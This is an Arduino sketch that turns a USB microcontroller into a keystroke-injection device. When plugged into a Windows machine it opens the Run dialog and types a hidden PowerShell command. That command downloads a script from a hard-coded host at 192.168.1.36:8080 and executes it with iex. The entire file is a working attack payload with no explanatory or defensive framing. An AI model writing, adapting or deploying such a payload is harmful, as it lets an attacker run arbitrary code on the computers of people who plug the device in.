#include<HID-Project.h>
void setup(){
    Keyboard.begin();
    delay(3000);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('d');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    Keyboard.releaseAll();
    delay(100);
    Keyboard.println("powershell.exe -W Hidden -C iex (new-object net.webclient).downloadstring('http://192.168.1.36:8080/W1Nd0WsP0WN3D')");
}

void loop(){}
